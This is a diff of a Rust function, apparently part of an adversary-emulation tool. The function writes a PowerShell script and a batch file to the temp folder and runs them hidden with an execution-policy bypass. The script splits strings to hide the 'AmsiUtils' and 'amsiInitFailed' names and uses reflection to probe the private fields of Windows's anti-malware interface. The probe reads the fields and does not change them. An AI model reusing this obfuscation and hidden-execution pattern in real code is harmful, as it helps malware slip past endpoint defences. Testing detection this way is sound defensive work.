@@ -156,60 +156,65 @@ Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
 
 #[cfg(target_os = "windows")]
 fn run_amsi_patch() -> ScenarioResult {
+    use std::os::windows::process::CommandExt;
+
     let rid = &uuid::Uuid::new_v4().to_string()[..8];
-    let ns = j(&["System.Ma", "nagement.Au", "tomation."]);
-    let cls = j(&["Am", "si", "Ut", "ils"]);
-    let fld1 = j(&["am", "si", "Con", "text"]);
-    let fld2 = j(&["am", "si", "Init", "Failed"]);
-    let script = format!(
-        r#"
-$fakeIn = "$env:TEMP\ap_{rid}.ps1"
-$fakeOut = "$env:TEMP\ap_{rid}.txt"
-"Emulation Test" | Out-File $fakeOut -Force
-$ns = -join('System.Ma','nagement.Au','tomation.')
-$cls = -join('{cls_a}','{cls_b}','{cls_c}','{cls_d}')
-$fld1 = -join('{fld1_a}','{fld1_b}','{fld1_c}','{fld1_d}')
-$fld2 = -join('{fld2_a}','{fld2_b}','{fld2_c}','{fld2_d}')
-$probeScript = @"
-try {{
-    `$t = [Ref].Assembly.GetType('$ns$cls')
-    if (`$t) {{
-        `$f1 = `$t.GetField('$fld1', 'NonPublic,Static')
-        `$f2 = `$t.GetField('$fld2', 'NonPublic,Static')
-        "Resolved f1: `$(`$f1.FieldType.Name) = `$(`$f1.GetValue(`$null))" | Out-File '$fakeOut' -Force
-        "Resolved f2: `$(`$f2.FieldType.Name) = `$(`$f2.GetValue(`$null))" | Out-File '$fakeOut' -Append
-    }} else {{
-        "Type unavailable" | Out-File '$fakeOut' -Force
-    }}
-}} catch {{
-    "Blocked: `$(`$_.Exception.Message)" | Out-File '$fakeOut' -Force
-}}
-"@
-[System.IO.File]::WriteAllText($fakeIn, $probeScript)
-$procs = @()
-1..3 | ForEach-Object {{
-    $proc = Start-Process "cmd.exe" `
-        -ArgumentList "/c powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$fakeIn`"" `
-        -WindowStyle Hidden -PassThru
-    $procs += $proc
-}}
-Start-Sleep -Seconds 2
-foreach ($p in $procs) {{ if (!$p.HasExited) {{ $p.Kill() }} }}
-if (Test-Path $fakeOut) {{
-    $result = Get-Content $fakeOut
-    Write-Output "AMSI probe result: $result"
-}} else {{
-    Write-Output "AMSI probe processes were intercepted"
-}}
-Remove-Item $fakeIn -Force -ErrorAction SilentlyContinue
-Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
-"#,
-        rid = rid,
-        cls_a = &cls[..2], cls_b = &cls[2..4], cls_c = &cls[4..6], cls_d = &cls[6..],
-        fld1_a = &fld1[..2], fld1_b = &fld1[2..4], fld1_c = &fld1[4..7], fld1_d = &fld1[7..],
-        fld2_a = &fld2[..2], fld2_b = &fld2[2..4], fld2_c = &fld2[4..8], fld2_d = &fld2[8..],
+    let temp = std::env::temp_dir();
+    let ps1_path = temp.join(format!("ap_{}.ps1", rid));
+    let out_path = temp.join(format!("ap_{}.txt", rid));
+    let bat_path = temp.join(format!("ap_{}.bat", rid));
+
+    let out_str = out_path.to_string_lossy().to_string();
+
+    let ps1_content = format!(
+        "$ns = -join('System.Ma','nagement.Au','tomation.')\n\
+         $cls = -join('Am','si','Ut','ils')\n\
+         $f1 = -join('am','si','Con','text')\n\
+         $f2 = -join('am','si','Init','Failed')\n\
+         try {{\n\
+             $t = [Ref].Assembly.GetType(\"$ns$cls\")\n\
+             if ($t) {{\n\
+                 $ff1 = $t.GetField($f1, 'NonPublic,Static')\n\
+                 $ff2 = $t.GetField($f2, 'NonPublic,Static')\n\
+                 \"Resolved f1: $($ff1.FieldType.Name) = $($ff1.GetValue($null))\" | Out-File '{out}' -Force\n\
+                 \"Resolved f2: $($ff2.FieldType.Name) = $($ff2.GetValue($null))\" | Out-File '{out}' -Append\n\
+             }} else {{\n\
+                 \"Type unavailable\" | Out-File '{out}' -Force\n\
+             }}\n\
+         }} catch {{\n\
+             \"Blocked: $($_.Exception.Message)\" | Out-File '{out}' -Force\n\
+         }}",
+        out = out_str,
     );
-    let output = run_ps(&script)?;
+
+    let bat_content = format!(
+        "@echo off\r\n\
+         echo Emulation Test > \"{out}\"\r\n\
+         start /b /wait cmd /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"{ps1}\"\r\n\
+         start /b /wait cmd /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"{ps1}\"\r\n\
+         start /b /wait cmd /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"{ps1}\"\r\n\
+         if exist \"{out}\" (\r\n\
+             type \"{out}\"\r\n\
+         ) else (\r\n\
+             echo AMSI probe processes were intercepted\r\n\
+         )\r\n",
+        ps1 = ps1_path.to_string_lossy(),
+        out = out_str,
+    );
+
+    std::fs::write(&ps1_path, &ps1_content).map_err(|e| e.to_string())?;
+    std::fs::write(&bat_path, &bat_content).map_err(|e| e.to_string())?;
+
+    let output = std::process::Command::new("cmd.exe")
+        .args(["/c", &bat_path.to_string_lossy()])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+        .map_err(|e| e.to_string())?;
+
+    let _ = std::fs::remove_file(&bat_path);
+    let _ = std::fs::remove_file(&ps1_path);
+    let _ = std::fs::remove_file(&out_path);
+
     Ok(("Anti-malware interface inspection via Reflection".to_string(), output))
 }
 
